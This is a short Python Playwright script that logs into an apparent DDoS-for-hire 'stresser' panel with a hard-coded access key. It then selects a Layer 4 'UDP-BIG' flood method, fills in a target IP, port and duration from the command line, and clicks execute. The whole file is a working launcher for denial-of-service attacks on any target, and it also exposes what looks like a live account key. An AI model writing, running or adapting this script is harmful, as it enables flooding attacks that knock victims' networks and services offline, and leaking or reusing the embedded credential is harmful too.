from playwright.sync_api import sync_playwright
import sys
import time

BASE_URL = "https://retrostress.net"
ACCESS_KEY = "98bf5dfd15bb4ac290bad0f04852c7b4615462bbe64a46c1917e496d3d1a12a8"
if len(sys.argv) != 4:
    print("Usage: python bg.py <IP> <PORT> <TIME>")
    exit()

IP = sys.argv[1]
PORT = sys.argv[2]
TIME = sys.argv[3]

with sync_playwright() as p:

    browser = p.chromium.launch(
        executable_path="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        headless=False
    )

    page = browser.new_page()

    print("[+] Opening login page")

    page.goto(f"{BASE_URL}/auth")

    page.wait_for_timeout(2000)

    page.fill("#accessKey", ACCESS_KEY)

    page.click("#loginSubmitBtn")

    page.wait_for_load_state("networkidle")

    print("[+] Logged in")

    page.goto(f"{BASE_URL}/panel")

    page.wait_for_timeout(4000)

    # LAYER 4
    page.locator("text=LAYER 4").click()

    time.sleep(1)

    # ALL
    page.locator("text=UDP").first.click()

    time.sleep(1)

    # OPEN METHOD
    page.locator("text=Search methods").first.click()

    time.sleep(2)

    # SELECT UDP-BIG
    page.locator("text=UDP-BIG").click()

    time.sleep(1)

    # IP
    page.locator("input[placeholder='127.0.0.1']").fill(IP)

    # PORT
    nums = page.locator("input[type='number']")

    nums.nth(0).fill(PORT)

    # DURATION
    nums.nth(1).fill(TIME)

    time.sleep(1)

    # EXECUTE
    page.locator("text=EXECUTE_TEST").click()

    print("[+] Done")

    time.sleep(10)

    browser.close()